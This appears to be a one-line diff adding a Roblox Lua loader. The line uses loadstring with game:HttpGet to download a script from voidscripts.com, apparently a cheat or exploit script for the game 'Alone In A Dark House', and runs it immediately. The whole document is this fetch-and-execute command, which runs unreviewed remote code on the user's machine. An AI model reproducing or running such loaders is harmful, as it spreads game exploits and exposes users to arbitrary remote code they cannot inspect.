@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("http://voidscripts.com/RIP/old/AloneInADarkHouse.lua"))()
